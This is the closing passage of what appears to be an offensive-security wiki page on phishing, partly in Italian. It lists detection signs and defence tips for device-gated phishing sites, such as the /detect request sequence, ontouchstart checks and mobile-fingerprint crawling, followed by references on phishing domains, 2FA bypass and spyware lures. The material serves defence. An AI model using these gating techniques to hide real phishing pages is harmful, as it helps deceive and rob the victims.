- Telemetria web: sequenza `GET /static/detect_device.js` → `POST /detect` → HTTP 500 per non‑mobile; i percorsi legittimi per vittime mobile restituiscono 200 con HTML/JS successivi.
- Blocca o esamina con attenzione le pagine che condizionano il contenuto esclusivamente su `ontouchstart` o controlli simili del dispositivo.

Consigli di difesa:
- Esegui i crawler con fingerprint simili a mobile e JS abilitato per rivelare contenuti gated.
- Genera un alert su risposte 500 sospette dopo `POST /detect` su domini appena registrati.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
